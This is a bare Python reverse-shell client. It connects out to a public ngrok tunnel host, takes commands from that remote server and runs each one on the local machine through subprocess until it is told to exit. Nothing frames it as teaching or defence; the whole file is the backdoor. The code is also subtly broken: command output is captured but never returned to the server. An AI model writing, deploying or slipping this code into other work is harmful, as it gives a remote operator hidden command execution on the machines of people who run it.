import socket
import subprocess

SERVER_HOST = "0.tcp.eu.ngrok.io"
SERVER_PORT = 12716
BUFFER_SIZE = 1024
# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# receive the greeting message

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "gui":
        menu = "Starting..."
        s.send(menu.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
# close client connection
s.close()